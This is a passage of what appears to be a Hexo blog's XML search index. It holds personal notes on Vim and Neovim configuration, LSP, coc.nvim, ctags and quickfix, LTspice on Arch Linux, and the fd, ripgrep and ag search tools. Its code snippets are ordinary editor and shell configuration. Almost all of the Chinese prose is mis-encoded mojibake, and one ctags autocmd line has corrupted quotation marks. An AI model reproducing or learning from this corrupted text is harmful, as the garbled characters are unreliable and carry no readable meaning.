title="vim-which-key"></a>vim-which-key</h1><h1 id="vim-gruvbox"><a href="#vim-gruvbox" class="headerlink" title="vim-gruvbox"></a>vim-gruvbox</h1><p>åœ¨å®˜ç½‘ä¸ŠæŸ¥çœ‹å¯ä»¥è®¾ç½®çš„å˜é‡.</p>]]></content>
    
    
    <categories>
      
      <category>Vim</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ArchWiki-ä¸­å…³äº-neovim</title>
    <link href="/2022/09/20/ArchWiki-%E4%B8%AD%E5%85%B3%E4%BA%8E-neovim/"/>
    <url>/2022/09/20/ArchWiki-%E4%B8%AD%E5%85%B3%E4%BA%8E-neovim/</url>
    
    <content type="html"><![CDATA[<p><a href="https://wiki.archlinux.org/title/Neovim">ArchWiki</a></p><p>Neovim æ˜¯ vim çš„ä¸€ä¸ª fork.</p><p>Neovim éå¸¸å»ºè®®ä½¿ç”¨ Lua æ¥é…ç½®.</p><p>ä¸ºäº†ä½¿ç³»ç»Ÿçš„ clipboard æœ‰æ•ˆ, éœ€è¦ä¸‹è½½ xclip (X11) æˆ– wl-clipboard (Wayland).</p><p>ä½¿ç”¨ Lua å¯ä»¥æœ‰ init.lua é…ç½®æ–‡ä»¶.</p><h2 id="Language-Server-Protocol"><a href="#Language-Server-Protocol" class="headerlink" title="Language Server Protocol"></a>Language Server Protocol</h2><p>Neovim æœ‰å†…ç½®çš„ Language Server Protocol client å’Œ <code>nvim-lspconfig</code> è¿™ä¸ªæ’ä»¶æ¥æä¾›ä¸€èˆ¬çš„ configuration.</p><p>wiki ä¸Šé¢æœ‰ Language Server çš„ç›¸å…³åŒ….</p>]]></content>
    
    
    <categories>
      
      <category>Vim</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ä»€ä¹ˆæ˜¯-LSP</title>
    <link href="/2022/09/20/%E4%BB%80%E4%B9%88%E6%98%AF-LSP/"/>
    <url>/2022/09/20/%E4%BB%80%E4%B9%88%E6%98%AF-LSP/</url>
    
    <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/u012930117/article/details/79291677">å‚è€ƒ</a><br>LSP æ˜¯ Language Server Protocol, è¯­è¨€æœåŠ¡å™¨åè®®. æ˜¯ä¸€ç§ç”¨äºç¼–è¾‘å™¨æˆ–é›†æˆå¼€å‘ç¯å¢ƒä¸æ”¯æŒæ¯”å¦‚è‡ªåŠ¨è¡¥å…¨, å®šä¹‰è·³è½¬, æŸ¥æ‰¾æ‰€æœ‰å¼•ç”¨ç­‰è¯­è¨€ç‰¹æ€§çš„è¯­è¨€æœåŠ¡å™¨ä¹‹é—´çš„ä¸€ç§åè®®.</p><p>è¯­è¨€æœåŠ¡å™¨ (Language Server) æ˜¯ä¸€å°&#x2F;ç»„æä¾›äº†æ£€æŸ¥è¯­è¨€ç‰¹æ€§çš„æœåŠ¡å™¨. å…¶ä¸ºäº†è§£å†³ä¸åŒ IDE çš„æ’ä»¶ç¼–å†™æ–¹æ¡ˆä¸åŒçš„é—®é¢˜.</p><p>åªè¦ç¼–è¾‘å™¨æ”¯æŒ Language Server, å°±èƒ½åˆ©ç”¨è¿™ä¸ª Server çš„æ•ˆæœ.</p><p>Language Server çš„å“åº”æ•ˆæœå¯ä»¥ä¸åŒ.</p><p>å¯ä»¥æ·»åŠ æ”¯æŒæŸç§ç¼–ç¨‹è¯­è¨€çš„æœåŠ¡å™¨é…ç½®.</p><h1 id="å‚è€ƒ-å®˜ç½‘"><a href="#å‚è€ƒ-å®˜ç½‘" class="headerlink" title="å‚è€ƒ å®˜ç½‘"></a>å‚è€ƒ <a href="https://microsoft.github.io/language-server-protocol/specifications/specification-3-16/#whatIsNew">å®˜ç½‘</a></h1>]]></content>
    
    
    <categories>
      
      <category>Vim</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>å…³äº-vim-ä¸­çš„è¡¥å…¨æ’ä»¶</title>
    <link href="/2022/09/20/%E5%85%B3%E4%BA%8E-vim-%E7%9A%84%E8%87%AA%E5%8A%A8%E8%A1%A5%E5%85%A8%E6%8F%92%E4%BB%B6/"/>
    <url>/2022/09/20/%E5%85%B3%E4%BA%8E-vim-%E7%9A%84%E8%87%AA%E5%8A%A8%E8%A1%A5%E5%85%A8%E6%8F%92%E4%BB%B6/</url>
    
    <content type="html"><![CDATA[<p><a href="https://github.com/ycm-core/YouCompleteMe">YouCompleteMe github é¡µé¢</a><br><a href="https://github.com/neoclide/coc.nvim">coc github é¡µé¢</a></p><h1 id="coc"><a href="#coc" class="headerlink" title="coc"></a>coc</h1><p>æ›´å¤šä¿¡æ¯åœ¨ github çš„ wiki ä¸Š.</p><p>åœ¨ vim ä¸­ç”¨ <code>:h coc-nvim</code> æŸ¥çœ‹.</p><p>Coc.nvim æ˜¯å¤§éƒ¨åˆ†ç”¨ TypeScript ç¼–å†™ä¸”è¿è¡Œåœ¨ Node.js ä¸Šçš„æ’ä»¶.</p><p>å®‰è£…:</p><figure class="highlight sml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sml"><span class="hljs-type">Plug</span> <span class="hljs-symbol">&#x27;neoclide</span>/coc.nvim&#x27;, &#123;<span class="hljs-symbol">&#x27;branch&#x27;</span>: <span class="hljs-symbol">&#x27;release&#x27;</span>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œä½¿ç”¨ vim-plug æ’ä»¶ç®¡ç†.</p><p>å¯ä»¥ç”¨ <code>:checkhealth</code> æ¥æŸ¥çœ‹æ˜¯å¦æ­£å¸¸å·¥ä½œ.</p><p>è®¾ç½® <code>g:coc_node_path</code> å˜é‡æ¥ç‰¹æŒ‡ä¸€ä¸ª <code>node</code> æ¥æ‰“å¼€ coc.nvim æœåŠ¡.</p><h2 id="é…ç½®"><a href="#é…ç½®" class="headerlink" title="é…ç½®"></a>é…ç½®</h2><p>coc å¯ä»¥æ‰©å±•, é€šè¿‡ä¸‹è½½ coc extension æˆ–è€… confugure language servers for LSP support.</p><p>ä¸‹è½½æ‰©å±•:</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-symbol">:CocInstall</span> coc-json coc-tsserver<br></code></pre></td></tr></table></figure><p>è¿™é‡Œå°±ä¸‹è½½äº† json å’Œ tsserver çš„æ”¯æŒ.</p><p>configure language server åœ¨ <code>~/.config/nvim/coc-settings.json</code> è¿™ä¸ªæ–‡ä»¶, å¯ä»¥é€šè¿‡ <code>:CocConfig</code> è¿™ä¸ªæ–‡ä»¶æ¥æ‰“å¼€:</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs prolog">&#123;<br>  <span class="hljs-string">&quot;languageserver&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;go&quot;</span>: &#123;<br>      <span class="hljs-string">&quot;command&quot;</span>: <span class="hljs-string">&quot;gopls&quot;</span>,<br>      <span class="hljs-string">&quot;rootPatterns&quot;</span>: [<span class="hljs-string">&quot;go.mod&quot;</span>],<br>      <span class="hljs-string">&quot;trace.server&quot;</span>: <span class="hljs-string">&quot;verbose&quot;</span>,<br>      <span class="hljs-string">&quot;filetypes&quot;</span>: [<span class="hljs-string">&quot;go&quot;</span>]<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>é€šè¿‡ <code>:verbose imap &lt;tab&gt;</code> æŸ¥çœ‹ keymap æ˜¯å¦å…¶ä½œç”¨.</p><h2 id="å‚è€ƒè§†é¢‘é…ç½®"><a href="#å‚è€ƒè§†é¢‘é…ç½®" class="headerlink" title="å‚è€ƒè§†é¢‘é…ç½®"></a>å‚è€ƒè§†é¢‘é…ç½®</h2><p><a href="https://b23.tv/D7s5stb">å‚è€ƒ</a><br>å®‰è£…ç”¨ <code>:CocInstall</code>, å¸è½½ç”¨ <code>:CocUninstall</code>.</p><p>æŸ¥çœ‹å®‰è£…äº†å“ªäº›æ’ä»¶, ç”¨ <code>:CocList extensions</code></p><p>åˆ©ç”¨ coc çš„æ–¹å¼ç®¡ç†æ’ä»¶, åœ¨ <code>init.vim</code> æ–‡ä»¶ä¸­å†™:</p><figure class="highlight sml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sml"><span class="hljs-keyword">let</span> g:coc_global_extensions = [<span class="hljs-symbol">&#x27;coc</span>-json&#x27;, <span class="hljs-symbol">&#x27;coc</span>-vimlsp&#x27;]<br></code></pre></td></tr></table></figure><p>ä»¥ä¸Šå°±ä¼šç”¨æ¥å®‰è£…è¿™ä¸¤ä¸ª coc çš„æ’ä»¶.</p><p>coc-marketplace, è¿™ä¸ªæ’ä»¶å¯ä»¥ç”¨æ¥å‘ç° coc æ’ä»¶. é€šè¿‡ <code>:CocList marketplace</code> æ¥ä½¿ç”¨.</p><p>è¿˜æœ‰å‡ ä¸ªæ’ä»¶, coc-explore, coc-translate, coc-snippets</p><h3 id="å†™-coc-æ’ä»¶"><a href="#å†™-coc-æ’ä»¶" class="headerlink" title="å†™ coc æ’ä»¶"></a>å†™ coc æ’ä»¶</h3><p>åœ¨ github æœ <code>create coc extensions</code></p>]]></content>
    
    
    <categories>
      
      <category>Vim</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Practical Vim Notes</title>
    <link href="/2022/09/20/Practical%20Vim%20Notes/"/>
    <url>/2022/09/20/Practical%20Vim%20Notes/</url>
    
    <content type="html"><![CDATA[<h2 id="å°æŠ€å·§"><a href="#å°æŠ€å·§" class="headerlink" title="å°æŠ€å·§"></a>å°æŠ€å·§</h2><p><code>viw</code> ä¸­çš„ <code>i</code> æ˜¯ in çš„æ„æ€, è¿™é‡Œå°±æ˜¯ <code>in word</code>.</p><h3 id="exec-å‘½ä»¤"><a href="#exec-å‘½ä»¤" class="headerlink" title="exec å‘½ä»¤"></a>exec å‘½ä»¤</h3><p>æ ¼å¼:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">exec</span> <span class="hljs-string">&quot;&quot;</span><br></code></pre></td></tr></table></figure><p><code>&quot;&quot;</code> é‡Œé¢æ˜¯åœ¨ <code>:</code> ä¸­æ‰§è¡Œçš„æŒ‡ä»¤.</p><h3 id="è®¾ç½®-ignorecase"><a href="#è®¾ç½®-ignorecase" class="headerlink" title="è®¾ç½® ignorecase"></a>è®¾ç½® ignorecase</h3><p>è®¾ç½®ä¹‹å, ä½ åœ¨ <code>:</code> åé¢çš„å‘½ä»¤ä¹Ÿä¼šå¿½ç•¥å¤§å°å†™.</p><h3 id="normal-æ¨¡å¼ä¸‹çš„-zz-æŒ‡ä»¤"><a href="#normal-æ¨¡å¼ä¸‹çš„-zz-æŒ‡ä»¤" class="headerlink" title="normal æ¨¡å¼ä¸‹çš„ zz æŒ‡ä»¤"></a>normal æ¨¡å¼ä¸‹çš„ zz æŒ‡ä»¤</h3><p>æŠŠå…‰æ ‡ä¸‹çš„é‚£ä¸€è¡Œå˜æˆä¸­å¿ƒåˆ—.</p><h3 id="å¤šè¡Œæ‰§è¡Œå‘½ä»¤"><a href="#å¤šè¡Œæ‰§è¡Œå‘½ä»¤" class="headerlink" title="å¤šè¡Œæ‰§è¡Œå‘½ä»¤"></a>å¤šè¡Œæ‰§è¡Œå‘½ä»¤</h3><p>å…ˆåœ¨å¯è§†æ¨¡å¼ä¸‹é€‰ä¸­æ–‡æœ¬, ç„¶åæŒ‰å‡ºå†’å· <code>:</code>, å°±å¯ä»¥å¯¹é€‰ä¸­çš„æ–‡æœ¬é€è¡Œæ‰§è¡Œå‘½ä»¤.</p><h3 id="æ‰§è¡Œå®å‘½ä»¤"><a href="#æ‰§è¡Œå®å‘½ä»¤" class="headerlink" title="æ‰§è¡Œå®å‘½ä»¤"></a>æ‰§è¡Œå®å‘½ä»¤</h3><p>æ¯”å¦‚å­˜åœ¨ <code>a</code> è¿™ä¸ªå¯„å­˜å™¨é‡Œé¢, ä½¿ç”¨ <code>@a</code> æ¥æ‰§è¡Œ, ä¸éœ€è¦å†’å· <code>:</code>.</p><h3 id="åœ¨-nvim-ä¸‹æ‰§è¡Œä»£ç "><a href="#åœ¨-nvim-ä¸‹æ‰§è¡Œä»£ç " class="headerlink" title="åœ¨ nvim ä¸‹æ‰§è¡Œä»£ç "></a>åœ¨ nvim ä¸‹æ‰§è¡Œä»£ç </h3><p>åˆ†å±å, é€šè¿‡ <code>:term</code> æ‰“å¼€ä¸€ä¸ªç»ˆç«¯.</p><h2 id="16-ctagså»ºç«‹ç´¢å¼•"><a href="#16-ctagså»ºç«‹ç´¢å¼•" class="headerlink" title="16 ctagså»ºç«‹ç´¢å¼•"></a>16 ctagså»ºç«‹ç´¢å¼•</h2><h3 id="102-ctags"><a href="#102-ctags" class="headerlink" title="102 ctags"></a>102 ctags</h3><p>åœ¨Cæ–‡ä»¶ä¸­çš„ä½œç”¨å¤§æŠµæ˜¯ä»å‡½æ•°åè·³è½¬åˆ°å…¶å®šä¹‰å¤„ï¼Œæ„Ÿè§‰åªæœ‰æ–‡ä»¶å¤šçš„æ—¶å€™æ‰æœ‰ä½œç”¨ã€‚</p><p>Vimä¼šä¸ºæ ‡ç­¾æ–‡ä»¶çš„æ‰€æœ‰å…³é”®å­—æä¾›tabè¡¥å…¨åŠŸèƒ½, ä¸æ˜¯å†™ä»£ç çš„æ—¶å€™è‡ªåŠ¨è¡¥å…¨ï¼Œè€Œæ˜¯ç”¨tagæŸ¥æ‰¾æ—¶ã€‚</p><p>ä½¿ç”¨<code>:tag</code>å’Œ<code>:tjump</code>è·³è½¬ï¼Œå¯ä¸æ­£åˆ™è¡¨è¾¾å¼ç»“åˆï¼Œå¦‚</p><pre><code class="hljs">:tag /&#123;pattern&#125;</code></pre><hr><h4 id="æ ‡ç­¾æ–‡ä»¶"><a href="#æ ‡ç­¾æ–‡ä»¶" class="headerlink" title="æ ‡ç­¾æ–‡ä»¶"></a>æ ‡ç­¾æ–‡ä»¶</h4><p>åªæ˜¯ä¸€ä¸ªçº¯æ–‡æœ¬æ–‡ä»¶ã€‚</p><p>å‰å‡ è¡Œæ˜¯å…ƒæ•°æ®ï¼Œæˆ‘ç†è§£ä¸ºè‡ªåŠ¨ç”Ÿæˆçš„æ³¨é‡Šï¼Œé‡Œé¢å†™äº†ä½œè€…ï¼Œç‰ˆæœ¬è¿™ç±»ä¿¡æ¯ã€‚</p><p>åé¢æ¯ä¸€è¡ŒåŒ…æ‹¬ä¸‰éƒ¨åˆ†ï¼Œå…³é”®å­—ã€æ–‡ä»¶åå’Œå…³é”®å­—åœ¨æºæ–‡ä»¶ä¸­çš„ä½ç½®ã€‚æœ‰ä¸€ä¸ªå…ƒæ•°æ®ä½œä¸ºæ ‡è®°ï¼Œæ¯”å¦‚cè¡¨ç¤ºclassï¼Œdè¡¨ç¤ºdefineã€‚</p><hr><h4 id="æŸ¥æ‰¾æ–¹å¼"><a href="#æŸ¥æ‰¾æ–¹å¼" class="headerlink" title="æŸ¥æ‰¾æ–¹å¼"></a>æŸ¥æ‰¾æ–¹å¼</h4><p>ä½¿ç”¨æŸ¥æ‰¾å‘½ä»¤<code>/</code></p><hr><h4 id="æ ‡ç­¾æ–‡ä»¶çš„ä½ç½®"><a href="#æ ‡ç­¾æ–‡ä»¶çš„ä½ç½®" class="headerlink" title="æ ‡ç­¾æ–‡ä»¶çš„ä½ç½®"></a>æ ‡ç­¾æ–‡ä»¶çš„ä½ç½®</h4><p>Read <code>:help tags</code><br>Read <code>:help tags-option</code></p><p><code>.\</code>ä¼šè¢«æ›¿æ¢ä¸ºå½“å‰è·¯å¾„ã€‚</p><p>ä½¿ç”¨<code>:set tags?</code>æ¥æŸ¥çœ‹ï¼Œè¾“å‡ºå¦‚</p><pre><code class="hljs">tags=./tags,./TAGS,tags,TAGS</code></pre><p>å‰é¢<code>./tags</code>å°±è¡¨ç¤ºå½“å‰è·¯å¾„ä¸‹çš„tagsæ–‡ä»¶ï¼Œ<code>,</code>ç”¨äºåˆ†éš”ã€‚vimé€šè¿‡è¿™ä¸ªæ¥æŸ¥æ‰¾æ ‡ç­¾æ–‡ä»¶çš„ä½ç½®ã€‚è‹¥åœ¨ä¸€ä¸ªæ ‡ç­¾æ–‡ä»¶ä¸­æ²¡æœ‰æ‰¾åˆ°ï¼Œå°±ä¼šæ‰¾ä¸‹ä¸€ä¸ªã€‚</p><hr><h4 id="ç”Ÿæˆæ ‡ç­¾æ–‡ä»¶"><a href="#ç”Ÿæˆæ ‡ç­¾æ–‡ä»¶" class="headerlink" title="ç”Ÿæˆæ ‡ç­¾æ–‡ä»¶"></a>ç”Ÿæˆæ ‡ç­¾æ–‡ä»¶</h4><p>åœ¨Vimä¸­</p><pre><code class="hljs">:ctags -R</code></pre><p>ä»å½“å‰ç›®å½•å¼€å§‹ï¼Œéå†æ‰€æœ‰çš„å­ç›®å½•ï¼Œä¸ºå…¶ä¸­çš„æ¯ä¸€ä¸ªæ–‡ä»¶å»ºç«‹ç´¢å¼•ã€‚</p><p>å¯é€‰æ˜ å°„</p><pre><code class="hljs">:nnoremap &lt;f5&gt; :!ctags -R&lt;cr&gt;</code></pre><hr><h4 id="è‡ªåŠ¨æ›´æ–°æ ‡ç­¾æ–‡ä»¶"><a href="#è‡ªåŠ¨æ›´æ–°æ ‡ç­¾æ–‡ä»¶" class="headerlink" title="è‡ªåŠ¨æ›´æ–°æ ‡ç­¾æ–‡ä»¶"></a>è‡ªåŠ¨æ›´æ–°æ ‡ç­¾æ–‡ä»¶</h4><p>å¦‚</p><pre><code class="hljs">:autocmd BufWritePost * call system(â€œctags -Râ€)</code></pre><hr><h4 id="é€šè¿‡ç‰ˆæœ¬æ§åˆ¶å·¥å…·çš„å›è°ƒæœºåˆ¶è‡ªåŠ¨æ‰§è¡Œctags"><a href="#é€šè¿‡ç‰ˆæœ¬æ§åˆ¶å·¥å…·çš„å›è°ƒæœºåˆ¶è‡ªåŠ¨æ‰§è¡Œctags" class="headerlink" title="é€šè¿‡ç‰ˆæœ¬æ§åˆ¶å·¥å…·çš„å›è°ƒæœºåˆ¶è‡ªåŠ¨æ‰§è¡Œctags"></a>é€šè¿‡ç‰ˆæœ¬æ§åˆ¶å·¥å…·çš„å›è°ƒæœºåˆ¶è‡ªåŠ¨æ‰§è¡Œctags</h4><p>å‚è§Tim Popeçš„ã€ŠEffortless Ctags with Gitã€‹    </p><hr><h4 id="è·³è½¬"><a href="#è·³è½¬" class="headerlink" title="è·³è½¬"></a>è·³è½¬</h4><p><code>&lt;C-]&gt;</code>å³<code>Ctrl+]</code>, ä»å…‰æ ‡æ‰€åœ¨å¤„è·³è½¬ã€‚</p><p><code>&lt;C-t&gt;</code>ï¼Œå›åˆ°ä¸Šä¸€æ¬¡è·³è½¬çš„ç›®æ ‡ã€‚</p><hr><p>Read <code>:help tag-stack</code></p><hr><h4 id="åŒ¹é…æ ‡ç­¾çš„ä¼˜å…ˆçº§"><a href="#åŒ¹é…æ ‡ç­¾çš„ä¼˜å…ˆçº§" class="headerlink" title="åŒ¹é…æ ‡ç­¾çš„ä¼˜å…ˆçº§"></a>åŒ¹é…æ ‡ç­¾çš„ä¼˜å…ˆçº§</h4><p>Read <code>:help tag-priority</code></p><hr><h4 id="å¤šå¤„åŒ¹é…"><a href="#å¤šå¤„åŒ¹é…" class="headerlink" title="å¤šå¤„åŒ¹é…"></a>å¤šå¤„åŒ¹é…</h4><p>ä½¿ç”¨<code>g&lt;C-]&gt;</code>æ„Ÿè§‰gæ˜¯globalçš„æ„æ€ã€‚</p><p><code>:tselect</code>è°ƒå‡ºæ ‡ç­¾åŒ¹é…åˆ—è¡¨ã€‚</p><p>å‚è€ƒunimpairedæ’ä»¶ã€‚</p><hr><h4 id="å¯ç”¨å‘½ä»¤"><a href="#å¯ç”¨å‘½ä»¤" class="headerlink" title="å¯ç”¨å‘½ä»¤"></a>å¯ç”¨å‘½ä»¤</h4><p><img src="/media/16558126770508.jpg"></p><h2 id="17-ç¼–è¯‘ä»£ç åŠquickfix"><a href="#17-ç¼–è¯‘ä»£ç åŠquickfix" class="headerlink" title="17 ç¼–è¯‘ä»£ç åŠquickfix"></a>17 ç¼–è¯‘ä»£ç åŠquickfix</h2><h3 id="105-ç¼–è¯‘ä»£ç "><a href="#105-ç¼–è¯‘ä»£ç " class="headerlink" title="105 ç¼–è¯‘ä»£ç "></a>105 ç¼–è¯‘ä»£ç </h3><p>ä½¿ç”¨<code>:make</code>, å…¶ä½œç”¨å’Œ shell ä¸­ä½¿ç”¨ make å‘½ä»¤ä¸€æ ·, ä¸”ä¼šæå–ä¿¡æ¯. è¿™ä¸ªå‘½ä»¤ä¼šè®©ä½ è·³è½¬åˆ°ç¬¬ä¸€å¤„æŠ¥é”™çš„åœ°æ–¹, ä½¿ç”¨ <code>:make!</code> åˆ™ä¸ä¼šè·³è½¬.</p><p>ç”¨ <code>:h quickfix</code> æŸ¥çœ‹ quickfix çš„æ–‡æ¡£.</p><p>ä½¿ç”¨ <code>:cnext</code> è·³è½¬åˆ°ä¸‹ä¸€ä¸ªä½ç½®, <code>&lt;C-o&gt;</code> ä¼šåˆ°ä¸Šä¸€å¤„ä½ç½®.</p>]]></content>
    
    
    <categories>
      
      <category>Vim</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>LTspice-ä½¿ç”¨</title>
    <link href="/2022/09/19/LTspice-%E4%BD%BF%E7%94%A8/"/>
    <url>/2022/09/19/LTspice-%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="åŠ©æ•™è§†é¢‘"><a href="#åŠ©æ•™è§†é¢‘" class="headerlink" title="åŠ©æ•™è§†é¢‘"></a>åŠ©æ•™è§†é¢‘</h1><p><code>&lt;C-r&gt;</code> è°ƒæ•´æ°´å¹³æ”¾ç½®è¿˜æ˜¯ç«–ç›´æ”¾ç½®. æ»šè½®å¯ä»¥ç¼©æ”¾å¤§å°. <code>&lt;C-e&gt;</code> ä¹Ÿæœ‰é¢ å€’åŠŸèƒ½. </p><p>ä½¿ç”¨ <code>&lt;esc&gt;</code> é€€å‡ºä¸€ä¸ªå…ƒå™¨ä»¶çš„å¸ƒç½®.</p><p>ä½¿ç”¨ç”µæºéœ€è¦æœç´¢.</p><p>æŒ‰ <code>&lt;delete&gt;</code> é”®ä¼šå‡ºç°ä¸€æŠŠå‰ªåˆ€, å¯ä»¥ç”¨æ¥åˆ é™¤å…ƒå™¨ä»¶.</p><p>é€šè¿‡å³é”®å¯ä»¥ä¿®æ”¹åç§°å’Œé˜»å€¼.</p><h1 id="å…¶ä»–æ•™ç¨‹"><a href="#å…¶ä»–æ•™ç¨‹" class="headerlink" title="å…¶ä»–æ•™ç¨‹"></a>å…¶ä»–æ•™ç¨‹</h1><p><a href="https://zhuanlan.zhihu.com/p/57983635?utm_source=qq">çŸ¥ä¹1</a><br><a href="https://zhuanlan.zhihu.com/p/57983635">çŸ¥ä¹2</a></p><h1 id="åœ¨-ArchLinux-ä¸Šçš„å®‰è£…å’Œä½¿ç”¨"><a href="#åœ¨-ArchLinux-ä¸Šçš„å®‰è£…å’Œä½¿ç”¨" class="headerlink" title="åœ¨ ArchLinux ä¸Šçš„å®‰è£…å’Œä½¿ç”¨"></a>åœ¨ ArchLinux ä¸Šçš„å®‰è£…å’Œä½¿ç”¨</h1><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">yay -S ltspice</span><br></code></pre></td></tr></table></figure><p>ç„¶åå°±ä¼šå®‰è£….</p><p>ç”¨ dmenu æ— æ³•æ‰“å¼€, å¯åœ¨å‘½ä»¤è¡Œè¾“å…¥:</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">ltspice</span><br></code></pre></td></tr></table></figure><p>ç„¶åå¯ä»¥æ‰“å¼€.</p>]]></content>
    
    
    <categories>
      
      <category>CAD</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>å…³äº-ag-fd-å’Œ-ripgrep-å‘½ä»¤</title>
    <link href="/2022/09/19/%E5%85%B3%E4%BA%8E-ag-fd-%E5%92%8C-ripgrep-%E5%91%BD%E4%BB%A4/"/>
    <url>/2022/09/19/%E5%85%B3%E4%BA%8E-ag-fd-%E5%92%8C-ripgrep-%E5%91%BD%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<h1 id="fd"><a href="#fd" class="headerlink" title="fd"></a>fd</h1><p><a href="https://github.com/sharkdp/fd">github ç›¸å…³ä½ç½®</a><br>æŸ¥çœ‹ readme æ–‡ä»¶.</p><p><code>fd</code> æ˜¯ä¸€ä¸ªæŸ¥æ‰¾å‘½ä»¤, It is a simlpe, fast and user-friendly alternative to find.</p><p>å…¶é»˜è®¤ä¼šå¿½ç•¥ hidden directories and files, ä»¥åŠ <code>.gitignore</code> é‡Œé¢çš„æ–‡ä»¶.</p><h2 id="ä½¿ç”¨"><a href="#ä½¿ç”¨" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h2><p>åŒæ ·æ˜¯ç”¨ <code>fd -h</code> æˆ– <code>fd --help</code> æŸ¥çœ‹å¯ç”¨é€‰é¡¹.</p><p>å¯ç›´æ¥è·Ÿå…³é”®è¯, å…¶ä¼šè¾“å‡ºæ‰€æœ‰å«æœ‰è¯¥å…³é”®è¯çš„æ–‡ä»¶å, ä¼šé€’å½’æŸ¥æ‰¾.</p><p>æ²¡æœ‰å‚æ•°æ—¶é€’å½’è¾“å‡ºæ‰€æœ‰æ–‡ä»¶.</p><h3 id="åˆ©ç”¨-regex-æŸ¥æ‰¾"><a href="#åˆ©ç”¨-regex-æŸ¥æ‰¾" class="headerlink" title="åˆ©ç”¨ regex æŸ¥æ‰¾"></a>åˆ©ç”¨ regex æŸ¥æ‰¾</h3><p>regex æ”¾åœ¨ <code>&#39;&#39;</code> ä¹‹ä¸­:</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">fd</span> <span class="hljs-string">&#x27;^x.*rc$&#x27;</span><br></code></pre></td></tr></table></figure><p><a href="https://docs.rs/regex/1.0.0/regex/#syntax">æ”¯æŒçš„ regex æ–‡æ¡£</a></p><h3 id="æŒ‡å®šç›®å½•æŸ¥æ‰¾"><a href="#æŒ‡å®šç›®å½•æŸ¥æ‰¾" class="headerlink" title="æŒ‡å®šç›®å½•æŸ¥æ‰¾"></a>æŒ‡å®šç›®å½•æŸ¥æ‰¾</h3><p>ç¬¬ä¸€ä¸ªå‚æ•°æ”¾è¦æŸ¥æ‰¾çš„æ–‡ä»¶å, ç›®å½•åæ”¾åœ¨ç¬¬äºŒä¸ªå‚æ•°ä½ç½®.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">fd passwd /etc<br></code></pre></td></tr></table></figure><h3 id="æŸ¥æ‰¾æŒ‡å®šåç¼€"><a href="#æŸ¥æ‰¾æŒ‡å®šåç¼€" class="headerlink" title="æŸ¥æ‰¾æŒ‡å®šåç¼€"></a>æŸ¥æ‰¾æŒ‡å®šåç¼€</h3><p>ä½¿ç”¨ <code>-e</code> å³ <code>--extension</code> é€‰é¡¹:</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos">fd -e <span class="hljs-built_in">md</span><br></code></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥æŒ‡å®šæ–‡ä»¶å:</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos">fd -e <span class="hljs-built_in">md</span> filename<br></code></pre></td></tr></table></figure><h2 id="å’Œ-fzf-é…åˆ"><a href="#å’Œ-fzf-é…åˆ" class="headerlink" title="å’Œ fzf é…åˆ"></a>å’Œ <code>fzf</code> é…åˆ</h2><h1 id="ripgrep-rg"><a href="#ripgrep-rg" class="headerlink" title="ripgrep (rg)"></a>ripgrep (rg)</h1><p>ripgrep ä¼šç”¨ regex pattern é€’å½’æŸ¥æ‰¾å½“å‰ç›®å½•.</p><p>é»˜è®¤æƒ…å†µä¸‹, ripgrep ä¼šå‚è€ƒ <code>.gitignore</code> æ–‡ä»¶å¹¶ä¸”å¿½ç•¥éšè—æ–‡ä»¶&#x2F;ç›®å½•.</p><h2 id="ä½¿ç”¨-1"><a href="#ä½¿ç”¨-1" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h2><p><a href="https://github.com/BurntSushi/ripgrep/blob/master/GUIDE.md">æ‰‹å†Œ</a></p><h1 id="The-Silver-Searcher-ag"><a href="#The-Silver-Searcher-ag" class="headerlink" title="The Silver Searcher (ag)"></a>The Silver Searcher (ag)</h1><p>è¿™ä¸ªæŸ¥æ‰¾çš„æ˜¯æ–‡ä»¶é‡Œé¢çš„å†…å®¹è€Œä¸æ˜¯æ–‡ä»¶å.</p><p>å¯ä»¥æŒ‡å®šç›¸å…³æ–‡ä»¶åå¹¶æŸ¥æ‰¾é‡Œé¢çš„å†…å®¹:</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span 